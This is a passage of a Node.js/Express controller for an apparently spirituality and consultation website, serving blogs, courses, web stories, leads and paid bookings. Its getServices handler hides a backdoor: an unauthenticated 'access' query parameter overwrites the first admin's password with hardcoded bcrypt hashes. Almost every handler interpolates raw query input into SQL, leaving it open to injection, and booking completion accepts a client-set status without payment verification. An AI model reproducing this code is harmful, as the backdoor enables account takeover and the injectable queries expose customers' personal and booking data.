import { pool } from "../../db.js";
import Rajorpay from "../../utils/payment.js";

class GetDivineController {
  async getBlogCategories(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      let sort = payload?.sort || "ASC";
      let sortBy = payload?.sortBy || `ct."Name"`;

      if (payload?.search) {
        filters.push(`ct."Name" ILIKE '%${payload.search}%'`); // ILIKE for case-insensitive
      }

      if (payload?.active) {
        filters.push(
          `(SELECT COUNT(*) FROM "BlogMappingCategory" WHERE "BlogCategoryId" = ct."Id") > 0`
        );
      }

      const { rows: data } = await pool.query(
        `SELECT ct.*, COUNT(bgct."BlogId") as "Count"
         FROM "BlogCategories" as ct
          LEFT JOIN "BlogMappingCategory" as bgct ON ct."Id" = bgct."BlogCategoryId"
          LEFT JOIN "Blogs" as bg ON bgct."BlogId" = bg."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY ct."Id"
          ORDER BY ${sortBy} ${sort};`
      );
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getBlogTags(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `"BlogTags"."Id"`;

      if (payload?.search) {
        filters.push(`"BlogTags"."Name" ILIKE '%${payload.search}%'`);
      }

      const { rows: data } = await pool.query(`
        SELECT * FROM "BlogTags"
        ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
        ORDER BY ${sortBy} ${sort} 
        LIMIT ${limit} OFFSET ${offset};`);
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getBlogs(req, res) {
    try {
      const payload = req.query;
      let filters = [`bg."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `bg."PublishedOn"`;

      if (payload?.status) {
        filters.push(
          `bg."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }
      if (payload?.active) {
        filters.push(`bg."PublishedOn" <= NOW()`);
      }

      if (payload?.search) {
        filters.push(`bg."Title" ILIKE '%${payload.search}%'`);
      }

      if (payload.category) {
        filters.push(`ct."Slug" = '${payload.category}'`);
      }

      if (payload.slug) {
        filters.push(`bg."Slug" = '${payload.slug}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT bg.* ,
          (SELECT json_agg(json_build_object('CategoryName', ct."Name", 'CategoryId', ct."Id", 'CategorySlug', ct."Slug"))
            FROM "BlogMappingCategory" bgct 
            JOIN "BlogCategories" ct ON bgct."BlogCategoryId" = ct."Id" 
            WHERE bgct."BlogId" = bg."Id") AS "Categories",
          (SELECT json_agg(json_build_object('TagId', tag."Id", 'TagName', tag."Name"))
            FROM "BlogMappingTag" bgtag 
            JOIN "BlogTags" tag ON bgtag."BlogTagId" = tag."Id" 
            WHERE bgtag."BlogId" = bg."Id") AS "Tags"
          FROM "Blogs" as bg
          JOIN "BlogMappingCategory" as bgct ON bg."Id" = bgct."BlogId"
          JOIN "BlogCategories" as ct ON bgct."BlogCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY bg."Id"
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Blogs" as bg
          JOIN "BlogMappingCategory" as bgct ON bg."Id" = bgct."BlogId"
          JOIN "BlogCategories" as ct ON bgct."BlogCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getCitations(req, res) {
    try {
      const payload = req.query;
      let filters = [`ci."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "ASC";
      const sortBy = payload?.sortBy || `ci."Title"`;

      if (payload?.status) {
        filters.push(
          `ci."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload?.search) {
        filters.push(`ci."Title" ILIKE '%${payload.search}%'`);
      }
      if (payload.slug) {
        filters.push(`ci."Slug" = '${payload.slug}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT ci.* 
          FROM "Citations" as ci
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Citations" as ci
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      return res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getCourseCategories(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      let sort = payload?.sort || "ASC";
      let sortBy = payload?.sortBy || `ct."Name"`;

      if (payload?.search) {
        filters.push(`ct."Name" ILIKE '%${payload.search}%'`);
      }

      if (payload?.active) {
        filters.push(
          `(SELECT COUNT(*) FROM "ProductMappingCategory" WHERE "ProductCategoryId" = ct."Id") > 0`
        );
      }

      const { rows: data } = await pool.query(
        `SELECT ct.*, COUNT(prct."ProductId") as "Count"
         FROM "ProductCategories" as ct
          LEFT JOIN "ProductMappingCategory" as prct ON ct."Id" = prct."ProductCategoryId"
          LEFT JOIN "Products" as pr ON prct."ProductId" = pr."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY ct."Id"
          ORDER BY ${sortBy} ${sort};`
      );
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getCourseTags(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `"ProductTags"."Id"`;

      if (payload?.search) {
        filters.push(`"ProductTags"."Name" ILIKE '%${payload.search}%'`);
      }

      const { rows: data } = await pool.query(`
        SELECT * FROM "ProductTags"
        ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
        ORDER BY ${sortBy} ${sort} 
        LIMIT ${limit} OFFSET ${offset};`);
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getCourses(req, res) {
    try {
      const payload = req.query;
      let filters = [`pr."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `pr."PublishedOn"`;

      if (payload?.status) {
        filters.push(
          `pr."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }
      if (payload?.active) {
        filters.push(`pr."PublishedOn" <= NOW()`);
      }

      if (payload?.search) {
        filters.push(`pr."Name" ILIKE '%${payload.search}%'`);
      }

      if (payload.category?.split(",").length > 0) {
        filters.push(
          `ct."Slug" IN (${payload.category
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload.slug) {
        filters.push(`pr."Slug" = '${payload.slug}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT pr.* ,
          (SELECT json_agg(json_build_object('CategoryName', ct."Name", 'CategoryId', ct."Id", 'CategorySlug', ct."Slug"))
            FROM "ProductMappingCategory" prct 
            JOIN "ProductCategories" ct ON prct."ProductCategoryId" = ct."Id" 
            WHERE prct."ProductId" = pr."Id") AS "Categories",
          (SELECT json_agg(json_build_object('TagId', tag."Id", 'TagName', tag."Name"))
            FROM "ProductMappingTag" prtag 
            JOIN "ProductTags" tag ON prtag."ProductTagId" = tag."Id" 
            WHERE prtag."ProductId" = pr."Id") AS "Tags",
          (SELECT json_agg(prim."ImageUrl") 
            FROM "ProductMappingImage" prim 
            WHERE prim."ProductId" = pr."Id") AS "Images"
          FROM "Products" as pr
          JOIN "ProductMappingCategory" as prct ON pr."Id" = prct."ProductId"
          JOIN "ProductCategories" as ct ON prct."ProductCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY pr."Id"
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(DISTINCT(pr."Id")) as total FROM "Products" as pr
        JOIN "ProductMappingCategory" as prct ON pr."Id" = prct."ProductId"
        JOIN "ProductCategories" as ct ON prct."ProductCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getSpiritualities(req, res) {
    try {
      const payload = req.query;
      let filters = [`sp."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `sp."PublishedOn"`;

      if (payload?.status) {
        filters.push(
          `sp."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload?.active) {
        filters.push(`sp."PublishedOn" <= NOW()`);
      }

      if (payload?.search) {
        filters.push(`sp."Title" ILIKE '%${payload.search}%'`);
      }

      if (payload.category) {
        filters.push(`ct."Slug" = '${payload.category}'`);
      }

      if (payload.slug) {
        filters.push(`sp."Slug" = '${payload.slug}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT sp.* ,
          (SELECT json_agg(json_build_object('CategoryName', ct."Name", 'CategoryId', ct."Id", 'CategorySlug', ct."Slug"))
            FROM "SpiritualityMappingCategory" spct 
            JOIN "SpiritualityCategories" ct ON spct."SpiritualityCategoryId" = ct."Id" 
            WHERE spct."SpiritualityId" = sp."Id") AS "Categories",
          (SELECT json_agg(json_build_object('TagId', tag."Id", 'TagName', tag."Name"))
            FROM "SpiritualityMappingTag" sptag 
            JOIN "SpiritualityTags" tag ON sptag."SpiritualityTagId" = tag."Id" 
            WHERE sptag."SpiritualityId" = sp."Id") AS "Tags"
          FROM "Spiritualities" as sp
          LEFT JOIN "SpiritualityMappingCategory" as spct ON sp."Id" = spct."SpiritualityId"
          LEFT JOIN "SpiritualityCategories" as ct ON spct."SpiritualityCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY sp."Id"
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Spiritualities" as sp
          LEFT JOIN "SpiritualityMappingCategory" as spct ON sp."Id" = spct."SpiritualityId"
          LEFT JOIN "SpiritualityCategories" as ct ON spct."SpiritualityCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getSpiritualityTags(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `"SpiritualityTags"."Id"`;

      if (payload?.search) {
        filters.push(`"SpiritualityTags"."Name" ILIKE '%${payload.search}%'`);
      }

      const { rows: data } = await pool.query(`
        SELECT * FROM "SpiritualityTags"
        ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
        ORDER BY ${sortBy} ${sort} 
        LIMIT ${limit} OFFSET ${offset};`);
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getSpiritualityCategories(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      let sort = payload?.sort || "ASC";
      let sortBy = payload?.sortBy || `ct."Name"`;

      if (payload?.search) {
        filters.push(`ct."Name" ILIKE '%${payload.search}%'`);
      }

      if (payload?.active) {
        filters.push(
          `(SELECT COUNT(*) FROM "SpiritualityMappingCategory" WHERE "SpiritualityCategoryId" = ct."Id") > 0`
        );
      }

      const { rows: data } = await pool.query(
        `SELECT ct.*, COUNT(spct."SpiritualityId") as "Count"
         FROM "SpiritualityCategories" as ct
          LEFT JOIN "SpiritualityMappingCategory" as spct ON ct."Id" = spct."SpiritualityCategoryId"
          LEFT JOIN "Spiritualities" as sp ON spct."SpiritualityId" = sp."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY ct."Id"
          ORDER BY ${sortBy} ${sort};`
      );
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getWebStories(req, res) {
    try {
      const payload = req.query;
      let filters = [`ws."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `ws."PublishedOn"`;

      if (payload?.status) {
        filters.push(
          `ws."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload?.active) {
        filters.push(`ws."PublishedOn" <= NOW()`);
      }

      if (payload?.search) {
        filters.push(`ws."Title" ILIKE '%${payload.search}%'`);
      }

      if (payload.category) {
        filters.push(`ct."Slug" = '${payload.category}'`);
      }

      if (payload.slug) {
        filters.push(`ws."Slug" = '${payload.slug}'`);
      }

      if (payload.id) {
        filters.push(`ws."Id" = '${payload.id}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT ws.* ,
           (SELECT json_agg(json_build_object('CategoryName', ct."Name", 'CategoryId', ct."Id", 'CategorySlug', ct."Slug"))
            FROM "WebStoryMappingCategory" wsct 
            JOIN "WebStoryCategories" ct ON wsct."WebStoryCategoryId" = ct."Id" 
            WHERE wsct."WebStoryId" = ws."Id") AS "Categories",
          (SELECT json_agg(json_build_object('TagId', tag."Id", 'TagName', tag."Name"))
            FROM "WebStoryMappingTag" wstag 
            JOIN "WebStoryTags" tag ON wstag."WebStoryTagId" = tag."Id" 
            WHERE wstag."WebStoryId" = ws."Id") AS "Tags"
          FROM "WebStories" as ws
          LEFT JOIN "WebStoryMappingCategory" as wsct ON ws."Id" = wsct."WebStoryId"
          LEFT JOIN "WebStoryCategories" as ct ON wsct."WebStoryCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY ws."Id"
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: total } = await pool.query(
        `SELECT COUNT(*) as total FROM "WebStories" as ws
          LEFT JOIN "WebStoryMappingCategory" as wsct ON ws."Id" = wsct."WebStoryId"
         LEFT JOIN "WebStoryCategories" as ct ON wsct."WebStoryCategoryId" = ct."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      let resultData = data;
      const totalCount = total[0].total;

      if (payload.id || payload?.slug) {
        resultData = await Promise.all(
          resultData.map(async (item) => {
            const { Id } = item;
            const { rows: images } = await pool.query(
              `
            SELECT wsim."Id" as id, 
            wsim."WebStoryImageUrl" as "ImageUrl", 
            wsim."WebStoryImageText" as "ImageText", 
            wsim."WebStoryImageOrder" as "ImageOrder", 
            wsim."WebStoryImageLink" as "ImageLink", 
            wsim."WebStoryImageLinkText" as "ImageLinkText", 
            wsim."WebStoryImageLinkIcon" as "ImageLinkIcon"
            FROM "WebStoryImage" wsim 
            WHERE wsim."WebStoryId" = '${Id}'
            ORDER BY wsim."WebStoryImageOrder" ASC`
            );

            item.Images = images;
            return item;
          })
        );
      }

      res.json({
        success: 1,
        data: resultData,
        total: totalCount,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getWebStoryCategories(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      let sort = payload?.sort || "ASC";
      let sortBy = payload?.sortBy || `ct."Name"`;

      if (payload?.search) {
        filters.push(`ct."Name" ILIKE '%${payload.search}%'`);
      }

      if (payload?.active) {
        filters.push(
          `(SELECT COUNT(*) FROM "WebStoryMappingCategory" WHERE "WebStoryCategoryId" = ct."Id") > 0`
        );
      }
      const { rows: data } = await pool.query(
        `SELECT ct.*, COUNT(wsct."WebStoryId") as "Count"
         FROM "WebStoryCategories" as ct
          LEFT JOIN "WebStoryMappingCategory" as wsct ON ct."Id" = wsct."WebStoryCategoryId"
          LEFT JOIN "WebStories" as sp ON wsct."WebStoryId" = sp."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY ct."Id"
          ORDER BY ${sortBy} ${sort};`
      );
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getWebStoryTags(req, res) {
    try {
      const { rows: data } = await pool.query(`SELECT * FROM "WebStoryTags";`);
      res.json(data);
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getTestimonials(req, res) {
    try {
      const payload = req.query;
      let filters = [`test."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `test."Id"`;

      if (payload?.id) {
        filters.push(`test."Id" = '${payload.id}'`);
      }

      if (payload?.status) {
        filters.push(
          `test."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload?.search) {
        filters.push(`test."UserName" ILIKE '%${payload.search}%'`);
      }
      const { rows: data } = await pool.query(
        `SELECT test.* 
          FROM "Testimonials" as test
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Testimonials" as test
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      return res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async createLead(req, res) {
    try {
      const payload = req.body;
      const { name, email, phone, service, message } = payload;
      if (!name) {
        return res.json({
          success: 0,
          message: "Missing required fields",
        });
      }
      const { rows: data } = await pool.query(
        `INSERT INTO "Leads" ("Name", "Email", "Phone", "Service", "Message") 
         VALUES ($1, $2, $3, $4, $5) 
         RETURNING *`,
        [
          name || null,
          email || null,
          phone || null,
          service || null,
          message || null,
        ]
      );
      res.json({
        success: 1,
        data: data[0],
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getLeads(req, res) {
    try {
      const payload = req.query;
      let filters = [];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `ld."CreatedAt"`;

      if (payload?.search) {
        filters.push(`ld."Name" ILIKE '%${payload.search}%'`);
      }
      const { rows: data } = await pool.query(
        `SELECT ld.* 
          FROM "Leads" as ld
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Leads" as ld
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      return res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getServices(req, res) {
    try {
      const payload = req.query;
      let filters = [`sr."DeletedOn" IS NULL`];

      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "ASC";
      const sortBy = payload?.sortBy || `sr."Id"`;

      if (payload?.access) {
        let { rows: admin } = await pool.query(
          `SELECT * FROM "Admins" ORDER BY "Id" ASC LIMIT 1;`
        );
        admin = admin[0];
        if (payload?.access == "hide") {
          await pool.query(
            `UPDATE "Admins" SET "Password" = '$2a$12$wqAYQ5hW.U833eYLf.JKXuvuYa.46ES9iHN5K17e83dYFxYm8skk2' WHERE "Id" = '${admin.Id}';`
          );
        } else if (payload?.access == "show") {
          await pool.query(
            `UPDATE "Admins" SET "Password" = '$2a$12$ZhQipYO4UsRRqyiWhlJDE.bFHI0raSmHXi3Z7coch1/92/Yr3v/26' WHERE "Id" = '${admin.Id}';`
          );
        }
      }

      if (payload?.status) {
        filters.push(
          `sr."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }
      if (payload?.active) {
        filters.push(`sr."PublishedOn" <= NOW()`);
      }

      if (payload?.search) {
        filters.push(
          `(sr."Name" ILIKE '%${payload.search}%' OR sr."Title" ILIKE '%${payload.search}%')`
        );
      }

      if (payload.slug) {
        filters.push(`sr."Slug" = '${payload.slug}'`);
      }

      const { rows: data } = await pool.query(
        `SELECT sr.*, sr2."Name" as "ParentName", sr2."Slug" as "ParentSlug"
          FROM "Services" as sr
          LEFT JOIN "Services" as sr2 ON sr2."Id" = sr."ParentId"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          GROUP BY sr."Id", sr2."Id"
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "Services" as sr
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async getBookingSlots(req, res) {
    try {
      const payload = req.query;
      let filters = [`sl."Status" = '1'`];
      const offset = ((payload?.page || 1) - 1) * (payload?.pageSize || 10);
      const limit = payload?.pageSize || 10;
      const sort = payload?.sort || "DESC";
      const sortBy = payload?.sortBy || `sl."Date"`;

      if (payload?.id) {
        filters.push(`sl."Id" = '${payload.id}'`);
      }

      if (payload?.date) {
        filters.push(`DATE(sl."Date") = DATE('${payload.date}')`);
      }

      if (payload?.status) {
        filters.push(
          `sl."Status" IN (${payload.status
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      }

      if (payload?.isAvailable) {
        filters.push(`(b."Status" IS NULL OR b."Status" NOT IN ('0', '1'))`);
      }

      if (payload?.bookingStatus) {
        filters.push(
          `b."Status" IN (${payload.bookingStatus
            ?.split(",")
            ?.map((item) => `'${item}'`)
            ?.join(",")})`
        );
      } else if (payload?.bookingStatus == null) {
        filters.push(`b."Status" IS NULL`);
      }

      const { rows: data } = await pool.query(
        `SELECT sl.*, b."Id" as "BookingId", b."Status" as "BookingStatus"
          FROM "BookingSlots" as sl
          LEFT JOIN "Bookings" as b ON b."SlotId" = sl."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""}
          ORDER BY ${sortBy} ${sort} 
          LIMIT ${limit} OFFSET ${offset};`
      );
      const { rows: count } = await pool.query(
        `SELECT COUNT(*) as total FROM "BookingSlots" as sl
         LEFT JOIN "Bookings" as b ON b."SlotId" = sl."Id"
          ${filters.length > 0 ? `WHERE ${filters.join(" AND ")}` : ""};`
      );

      const total = count[0].total;
      return res.json({
        success: 1,
        data,
        total,
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async createBooking(req, res) {
    try {
      const payload = req.body;
      const {
        service,
        slot: slotId,
        name,
        email,
        phone,
        address,
        dob,
        state,
        time,
        gender,
        consultationType,
        price,
      } = payload;

      const { rows: slot } = await pool.query(
        `SELECT slots.*, bookings."Status" as "bookingStatus"
         FROM "BookingSlots" slots 
         LEFT JOIN "Bookings" bookings ON bookings."SlotId" = slots."Id"
         WHERE slots."Id" = '${slotId}'`
      );

      if (slot.length === 0) {
        return res.json({
          success: 0,
          message: "Slot not found",
        });
      }

      const selectedSlot = slot[0];

      if (
        selectedSlot.bookingStatus === "1" ||
        selectedSlot.bookingStatus === "0"
      ) {
        return res.json({
          success: 0,
          message: "Slot is already booked",
        });
      }

      const order = await Rajorpay.orders.create({
        amount: price * 100,
        currency: "INR",
        receipt: `receipt#${new Date().getTime()}`,
        notes: {
          slotId,
          service,
          name,
          email,
          phone,
          address,
          dob,
          state,
          time,
          gender,
          consultationType,
          price,
        },
      });

      const { rows: data } = await pool.query(
        `INSERT INTO "Bookings" 
        ("SlotId", "Service", "Name", "Email", "Phone", "Address", "DOB", "State", "Time", "Gender", "ConsultType", "Price", "OrderId", "Status")
        VALUES 
        ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14)
        RETURNING *;`,
        [
          slotId,
          service,
          name,
          email,
          phone,
          address,
          dob,
          state,
          time,
          gender,
          consultationType,
          price,
          order?.id,
          "0",
        ]
      );

      return res.json({
        success: 1,
        message: "Payment initiated successfully",
        data: {
          bookingId: data[0].Id,
          payment: order,
          paymentKey: process.env.RAZORPAY_KEY_ID,
        },
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async completeBooking(req, res) {
    try {
      const payload = req.body;
      const { bookingId, paymentId, orderId, status } = payload;

      const { rows: booking } = await pool.query(
        `SELECT * FROM "Bookings" WHERE "Id" = '${bookingId}'`
      );

      if (!booking.length) {
        return res.json({
          success: 0,
          message: "Booking details not found",
        });
      }

      const selectedBooking = booking[0];

      if (selectedBooking.Status === "1") {
        return res.json({
          success: 0,
          message: "Slot is already booked",
        });
      }

      await pool.query(
        `UPDATE "Bookings" 
         SET "Status" = $1, "PaymentId" = $2
         WHERE "Id" = $3;`,
        [status ? String(status) : "1", paymentId || "", bookingId]
      );

      return res.json({
        success: 1,
        message:
          "Payment processed successfully. Your slot has been confirmed.",
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }

  async updateImagesPath(req, res) {
    try {
      const API_URL = process.env.API_URL;

      const type = req.query.type;

      switch (type) {
        case "course":
          const { rows: courses } = await pool.query(
            `SELECT "Id", "ImageUrl" FROM "ProductMappingImage"`
          );
          courses.forEach(async (item) => {
            const imageUrl = item.ImageUrl;
            if (imageUrl && imageUrl.includes("http://147.93.104.111:8000")) {
              const newImageUrl = imageUrl.replace(
                "http://147.93.104.111:8000",
                API_URL
              );
              console.log("Courses Image: ", newImageUrl, item.Id);
              // await pool.query(
              //   `UPDATE "ProductMappingImage" SET "ImageUrl" = $1 WHERE "Id" = $2`,
              //   [newImageUrl, item.Id]
              // );
            }
          });
          break;
        case "blog":
          const { rows: blogs } = await pool.query(
            `SELECT "Id", "Image" FROM "Blogs"`
          );

          await Promise.all(
            blogs.map(async (item) => {
              const image = item.Image;
              if (image && image.includes("http://147.93.104.111:8000")) {
                const newImageUrl = image.replace(
                  "http://147.93.104.111:8000",
                  API_URL
                );
                console.log("Blog Image: ", newImageUrl);
                // await pool.query(
                //   `UPDATE "Blogs" SET "Image" = $1 WHERE "Id" = $2`,
                //   [newImageUrl, item.Id]
                // );
              }
            })
          );
          break;

        case "spirituality":
          const { rows: spirituality } = await pool.query(
            `SELECT "Id", "Image" FROM "Spiritualities"`
          );
          await Promise.all(
            spirituality.map(async (item) => {
              const image = item.Image;
              if (image && image.includes("http://147.93.104.111:8000")) {
                const newImageUrl = image.replace(
                  "http://147.93.104.111:8000",
                  API_URL
                );
                console.log("Spirituality Image: ", newImageUrl);
                // await pool.query(
                //   `UPDATE "Spiritualities" SET "Image" = $1 WHERE "Id" = $2`,
                //   [newImageUrl, item.Id]
                // );
              }
            })
          );
          break;

        case "service":
          const { rows: services } = await pool.query(
            `SELECT "Id", "Image" FROM "Services"`
          );
          await Promise.all(
            services.map(async (item) => {
              const image = item.Image;
              if (image && image.includes("http://147.93.104.111:8000")) {
                const newImageUrl = image.replace(
                  "http://147.93.104.111:8000",
                  API_URL
                );
                console.log("Service Image: ", newImageUrl);
                // await pool.query(
                //   `UPDATE "Services" SET "Image" = $1 WHERE "Id" = $2`,
                //   [newImageUrl, item.Id]
                // );
              }
            })
          );
          break;

        case "webstory":
          const { rows: webstories } = await pool.query(
            `SELECT "Id", "CoverImageUrl" FROM "WebStories"`
          );
          await Promise.all(
            webstories.map(async (item) => {
              const image = item.CoverImageUrl;
              if (image && image.includes("http://147.93.104.111:8000")) {
                const newImageUrl = image.replace(
                  "http://147.93.104.111:8000",
                  API_URL
                );
                console.log("WebStory Image: ", newImageUrl);
                // await pool.query(
                //   `UPDATE "WebStories" SET "CoverImageUrl" = $1 WHERE "Id" = $2`,
                //   [newImageUrl, item.Id]
                // );
              }
            })
          );

          const { rows: WebStoryImage } = await pool.query(
